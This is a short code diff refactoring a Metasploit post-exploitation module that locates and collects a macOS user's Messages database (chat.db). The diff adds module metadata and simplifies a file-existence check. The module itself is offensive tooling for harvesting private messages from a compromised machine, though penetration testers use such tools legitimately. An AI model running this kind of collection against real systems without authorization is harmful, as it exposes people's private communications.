@@ -29,7 +29,12 @@ class MetasploitModule < Msf::Post
           ['LATEST', { 'Description' => 'Collect the latest message' }],
           ['ALL', { 'Description' => 'Collect all Messages data' }]
         ],
-        'DefaultAction' => 'ALL'
+        'DefaultAction' => 'ALL',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
 
@@ -46,18 +51,12 @@ class MetasploitModule < Msf::Post
 
     # Check file exists
     messages_path = "/Users/#{user}/Library/Messages/chat.db"
-    if file_exist?(messages_path)
-      print_good("#{peer} - Messages DB found: #{messages_path}")
-    else
+
+    unless file_exist?(messages_path)
       fail_with(Failure::Unknown, "#{peer} - Messages DB does not exist")
     end
 
-    # Check messages.  And then set the default profile path
-    unless messages_path
-      fail_with(Failure::Unknown, "#{peer} - Unable to find messages, will not continue")
-    end
-
-    print_good("#{peer} - Found Messages file: #{messages_path}")
+    print_good("#{peer} - Messages DB found: #{messages_path}")
 
     files = []
 
